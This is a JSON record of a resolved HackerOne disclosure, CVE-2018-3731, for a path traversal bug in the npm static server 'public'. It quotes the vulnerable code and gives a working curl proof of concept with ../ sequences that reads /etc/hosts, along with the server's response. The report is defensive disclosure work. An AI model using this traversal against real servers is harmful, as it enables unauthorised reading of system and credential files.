{
  "id": 312918,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTI5MTg=",
  "url": "https://hackerone.com/reports/312918",
  "title": "[public] Path Traversal allows to read content of arbitrary files",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-02-06T16:12:58.503Z",
  "submitted_at": "2018-02-06T16:12:58.503Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2018-3731"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-02-17T17:44:13.493Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-02-15T19:08:18.066Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Guys,\n\nThere is Path Traversal in public module.\nIt allows to read content of arbitrary files on the remote server.\n\n## Module\n\n**public**\n\nRun static file hosting server with specified public dir & port. Support a \"direcotry index\" like Apache httpd.\n\nhttps://www.npmjs.com/package/public\n\nversion: 0.1.2\n\nStats\n3 downloads in the last day\n30 downloads in the last week\n384 downloads in the last month\n\n~4600 estimated downloads per year\n\n\n## Description\n\nLack of file path sanitization causes that any file on the server might be read by malicious user.\n\nVulnerability exists, because path is used without any check against Path Traversal attacks:\n\n```javascript\n// node_modules/public/bin/public, line 73:\n    var pathname = url.parse(req.url).pathname;\n    var filePath = path.join(dir, pathname); // Real file path\n    var base = filePath.replace(dir, ''); // Base path for browser link\n    var abs = path.resolve(filePath); \n    console.log(new Date().toString(), abs);\n    fs.readFile(filePath, function(err, data) {\n      if (err) {\n        (...)\n      }\n      res.writeHead(200, { 'Content-Type': mime.lookup(filePath) });\n      res.end(data);\n```\nAs you can notice, ```filePath``` is used directly, as read from url.\n\n## Steps To Reproduce:\n\n\n- install ```public```:\n\n```\n$ npm install public\n```\n\n- run ```public``` in direcotry of your choice:\n\n```\nme:~/playground/hackerone/Node$ ./node_modules/public/bin/public ./ 8080\nPublic.js server running with \"/home/rafal.janicki/playground/hackerone/Node\" on port 8080\n```\n\n- execute following ```curl``` command (adjust number of ../ to reflect your system):\n\n```\n$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts\n```\n\n- see result:\n\n```\n*   Trying 127.0.0.1...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n> GET /../../../../../etc/hosts HTTP/1.1\n> Host: 127.0.0.1:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< last-modified: Tue, 23 Jan 2018 14:51:52 GMT\n< content-length: 188\n< content-type: application/octet-stream\n< Date: Tue, 06 Feb 2018 15:40:51 GMT\n< Connection: keep-alive\n< \n127.0.0.1\tlocalhost\n127.0.1.1\tLT0081U2\n\n# The following lines are desirable for IPv6 capable hosts\n::1     localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n* Connection #0 to host 127.0.0.1 left intact\n```\n\n## Supporting Material/References:\n\n\n- Ubuntu 16.04 LTS\n- Chromium 66.0.3333.0 (Developer Build) (64-bit) \n- Node.js version: v8.9.4 LTS\n- npm version: 5.6.0\n- curl 7.47.0\n\n\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\n\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows to read content of arbitrary files from the server where module is run.",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-03-17T19:08:18.195Z",
  "allow_singular_disclosure_after": -186515408.46567792,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "cuso4",
    "eveeez",
    "khaledibnalwalid",
    "japz"
  ],
  "severity": {
    "rating": "high",
    "score": 8.6,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 5910,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "public",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
